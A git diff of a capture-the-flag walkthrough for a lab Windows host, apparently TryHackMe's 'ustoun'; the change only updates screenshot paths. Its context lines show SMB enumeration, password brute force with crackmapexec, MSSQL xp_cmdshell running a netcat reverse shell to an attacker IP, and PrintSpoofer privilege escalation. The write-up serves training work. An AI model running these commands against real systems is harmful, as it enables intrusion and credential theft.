@@ -54,13 +54,13 @@ SMB is running now scan for if we can read or write to any share
 
 `smbmap -H ustoun.thm -u anonymous`
 
-![smbmap-scan1](/screenshot/smbmap-scan1.png)
+![smbmap-scan1](/Images/ustoun/smbmap-scan1.png)
 
 IPC$ share is readable so we can enumerate users.
 
 `lookupsid.py anonymous@ustoun.thm`
 
-![lookupsid](/screenshot/lookupsid.png)
+![lookupsid](/Images/ustoun/lookupsid.png)
 
 Edit list and put users into list for furthur enumeration
 
@@ -84,7 +84,7 @@ im to bruteforce user `krbtgt` and `SVC-Kerb` separatly.
 
 `crackmapexec smb ustoun.thm -u 'SVC-Kerb' -p /opt/rockyou.txt` 
 
-![crackmapexec](/screenshot/crackmapexec.png)
+![crackmapexec](/Images/ustoun/crackmapexec.png)
 
 With this creds i checked available SMB for any file but no luck.
 
@@ -94,7 +94,7 @@ Lets see if same password used in other services also, lets try to access mssql
 
 login is success, after some reserach found out we can execute command using `EXEC xp_cmdshell` with that help we can get stable shell.
 
-![mssql](/screenshot/mssql.png)
+![mssql](/Images/ustoun/mssql.png)
 
 Download and upload nc.exe and get shell.
 **[NC](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)**
@@ -109,17 +109,17 @@ Download and upload nc.exe and get shell.
 + SQL> EXEC xp_cmdshell 'C:\munaz\nc64.exe -e cmd $IP 443'
 ```
 
-![upload](/screenshot/upload.png)
+![upload](/Images/ustoun/upload.png)
 
 make lister and execute the nc.
 
-![nc-shell](/screenshot/nc-shell.png)
+![nc-shell](/Images/ustoun/nc-shell.png)
 
 # ROOT FLAG
 
 We got shell but we do not have enough permission to read `user.txt` so we need to escalate privilege 
 
-![user-flag](/screenshot/userflag.png)
+![user-flag](/Images/ustoun/userflag.png)
 
 Lets see what privilege we have using this command `whoami /priv`
 
@@ -147,7 +147,7 @@ using above command upload it then execute it with this command give to root acc
 
 `PrintSpoofer.exe -i -c cmd`
 
-![root-flag](/screenshot/rootflag.png)
+![root-flag](/Images/rootflag.png)
 
 # Flags
 
